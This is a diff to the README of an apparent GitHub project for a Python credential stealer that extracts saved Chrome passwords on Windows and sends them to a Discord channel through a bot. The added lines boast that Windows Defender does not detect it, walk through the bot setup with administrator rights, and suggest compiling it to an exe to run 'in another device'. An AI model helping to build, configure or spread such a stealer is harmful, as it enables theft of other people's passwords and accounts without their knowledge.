@@ -1,5 +1,5 @@
 # chrome_password_stealer
-This python script steals all the chrome password stored in a device and uploads them into a discord server
+This python script steals all the chrome password stored in a device and uploads them into a discord server. This program only works in windows and only for chrome. The windows defender doesn't detect it but maybe other programs can.
 ## instalation
 Download or clone the repository and eecute this command to install all dependencies, if you want to compile to a exe file you will need to install pyinstaller too.
 ```bash
@@ -31,3 +31,14 @@ Then you need to go to the https://discord.com/developers/ the discord thevelope
 Then you ned to navigate to the bot section and create a new bot and enable all types of intents and select administrator on the bot permission settings. Then save the changes.
 ![Image of the bot configuration](https://github.com/lleeerrriiiccc/chrome_password_stealer/blob/main/images/intents.png)
 ![image of the bot configuration](https://github.com/lleeerrriiiccc/chrome_password_stealer/blob/main/images/intents.png)
+
+Then renew the bot token and paste it into the code where indicated.
+### Adding bot to server
+
+Navigate tho the 0auth section and click on bot and then administrator. Once this done select Guild install in the list below. Copy the link and acces to it. Select the server you want to use and click on authorize.
+
+After this is done go back to your discord app and copi the id on the chanel you want the bot to send the fil. Do so by left click on the chanel and select copi canel id.
+Then paste the chanel id where indicated in the code.
+
+## results
+After you completed all the previous steps you can test the code by running it in your own computer or compiling it and running it in another device.
